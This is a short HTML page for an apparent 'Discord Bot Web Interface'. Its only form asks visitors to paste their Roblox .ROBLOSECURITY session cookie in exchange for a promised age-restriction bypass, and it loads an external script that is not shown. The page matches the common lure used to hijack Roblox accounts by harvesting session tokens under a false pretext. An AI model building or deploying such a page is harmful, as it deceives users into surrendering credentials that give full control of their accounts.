<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Bot Web Interface</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="container">
        <h1>Discord Bot Web Interface</h1>
        <form id="ageBypassForm">
            <label for="cookie">Enter your .ROBLOSECURITY Cookie:</label>
            <input type="text" id="cookie" name="cookie" required placeholder="Enter your cookie">
            <button type="submit">Bypass Age Restriction</button>
        </form>
        <div id="responseMessage" class="message"></div>
    </div>

    <script src="/js/script.js"></script>
</body>
</html>
